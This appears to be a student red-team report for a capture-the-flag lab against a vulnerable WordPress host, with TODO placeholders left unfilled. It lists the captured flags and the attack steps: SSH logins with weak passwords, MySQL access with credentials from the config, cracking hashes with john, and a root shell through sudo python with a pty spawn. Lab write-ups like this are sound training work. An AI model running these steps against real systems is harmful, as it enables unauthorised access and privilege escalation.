# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

```bash
$ nmap #192.168.1.110
  # TODO: Insert scan output
```

This scan identifies the services below as potential points of entry:
- Target 1
  - 22/tcp SSH
  - 80/tcp http
_TODO: Fill out the list below. Include severity, and CVE numbers, if possible._

The following vulnerabilities were identified on each target:
- Target 1
  - WordPress XML-RPC Username/Password Login Scanner
    - CVE-1999-0502
  - WordPress Pingback Locator
    - CVE-2013-0235
  - Cron WordPress Attacks
  

### Exploitation


The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: b9bbcb33e11b80be759c4e844862482d
    - **Exploit Used**
      - Open Port 22 SSH with weak password
      - ssh michael@192.168.1.110 
        - password: michael
  - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
    - **Exploit Used**
      - Open Port 22 SSH with weak password
      - ssh michael@192.168.1.110 
        - password: michael
  - `flag3.txt`: afc01ab56b50591e7dccf93122770cd2
    - **Exploit Used**
      - WordPress Configuration, SQL Database
      - mysql -h localhost -u root -p wordpress
        - password: R@v3nSecurity
      - mysql> SELECT * FROM wp_posts;
  - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
    - **Exploit Used**
      - Privilege escalation
      - mysql> use wp_users
        - create wp_hashes.txt with users and hashes
          - root@Kali:~# john wp_hashes.txt
      - ssh steven@192.168.1.110
        - password: pink84
          - find out what sudo privilege Steven has: sudo -l
          - escalate to root:
            - sudo python -c 'import pty;pty.spawn("/bin/bash")'
  